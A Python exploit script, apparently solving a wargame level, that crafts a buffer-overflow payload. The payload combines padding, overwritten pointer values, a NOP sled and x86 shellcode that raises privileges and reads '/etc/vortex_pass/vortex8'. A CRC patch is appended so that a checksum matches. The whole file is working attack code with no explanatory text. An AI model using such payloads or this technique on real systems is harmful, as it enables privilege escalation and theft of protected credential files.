import sys
from crcpatch import patch4, crc7

buf = int(sys.argv[1], 16)
out = sys.argv[2]
TOTAL = 350
sc = bytes.fromhex(
    "31dbb713b39089d9b046cd80"
    "31c050"
    "6874657838"
    "682f766f72"
    "6870617373"
    "687465785f"
    "682f766f72"
    "682f657463"
    "89e331c9b005cd80"
    "89c3b00389e131d2b264cd80"
    "89c2b004b30189e1cd80"
    "b00131dbcd80"
)
assert b"\x00" not in sc, "NUL in shellcode"
sled = TOTAL - 78 - len(sc) - 4
ecx_val = buf + 78
ret_val = buf + 160
payload = b"A"*62 + ecx_val.to_bytes(4,"little") + b"BBBB" + b"BBBB" + ret_val.to_bytes(4,"little") + b"\x90"*sled + sc
assert len(payload) == TOTAL - 4
patch = patch4(payload, 0xe1ca95ee)
assert patch and b"\x00" not in patch, patch
full = payload + patch
assert len(full) == TOTAL and b"\x00" not in full
print(f"buf=0x{buf:x} sc={len(sc)} sled={sled} len={len(full)}")
open(out, "wb").write(full)
